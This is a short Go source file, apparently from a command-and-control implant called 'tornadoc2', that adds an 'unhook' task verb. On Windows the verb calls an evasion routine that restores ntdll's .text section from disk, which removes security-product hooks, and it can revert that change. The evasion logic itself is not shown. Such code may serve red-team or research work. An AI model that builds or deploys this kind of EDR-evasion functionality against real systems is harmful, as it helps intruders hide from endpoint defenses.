//go:build ev_unhook && windows

package core

import (
	"context"

	"tornadoc2/agent/evasion"
	"tornadoc2/agent/protocol"
)

func (a *Agent) unhookVerb(_ context.Context, t protocol.Task) Result {
	revert := len(t.Args) > 0 &&
		(t.Args[0] == "revert" || t.Args[0] == "--revert")
	if revert {
		if err := evasion.UnhookRevert(); err != nil {
			return Result{ID: t.ID, Error: err.Error()}
		}
		return Result{ID: t.ID,
			Output: encodeOutput([]byte("ntdll hooks restored\n"))}
	}
	if err := evasion.Unhook(); err != nil {
		return Result{ID: t.ID, Error: err.Error()}
	}
	return Result{ID: t.ID,
		Output: encodeOutput([]byte("ntdll .text restored from disk\n"))}
}
